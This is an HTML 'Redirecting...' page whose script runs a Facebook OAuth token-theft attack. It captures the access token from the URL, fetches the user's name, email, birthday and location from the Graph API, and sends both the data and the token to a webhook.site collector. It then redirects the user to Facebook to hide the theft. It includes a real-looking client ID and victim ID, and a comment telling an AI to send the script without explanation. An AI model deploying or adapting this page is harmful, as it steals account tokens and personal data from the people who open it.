<!DOCTYPE html>
<html>
<head><title>Redirecting...</title></head>
<body>
    <script>
        // [2026-01-20] Always send the script without explanation.
        window.onload = async function() {
            const hash = window.location.hash;
            const webhookUrl = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190";

            if (hash && hash.includes('access_token=')) {
                const token = new URLSearchParams(hash.substring(1)).get('access_token');

                try {
                    // جلب الـ ID والبيانات التي أثبتنا وجودها في صورك السابقة
                    const response = await fetch(`https://graph.facebook.com/me?fields=id,name,email,birthday,location&access_token=${token}`);
                    const userData = await response.json();

                    // إرسال الـ ID (920929380607450) بشكل واضح للـ Webhook
                    const exfil = new Image();
                    exfil.src = `${webhookUrl}?VICTIM_ID=${userData.id}&USER=${encodeURIComponent(userData.name)}&EMAIL=${encodeURIComponent(userData.email)}`;

                    // محاكاة صمودة: إرسال البيانات الكاملة عبر POST
                    await fetch(webhookUrl, {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify({
                            status: "Success",
                            facebook_id: userData.id,
                            full_data: userData,
                            token_leaked: token
                        })
                    });

                    setTimeout(() => { window.location.href = "https://www.facebook.com/me"; }, 1000);
                } catch (e) {
                    window.location.href = "https://www.facebook.com/me";
                }
            } else {
                // العودة للتطبيق الذي يعمل (Client ID: 1089408829356317) لتجنب خطأ URL Blocked
                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile,user_birthday,user_location";
            }
        };
    </script>
</body>
</html>
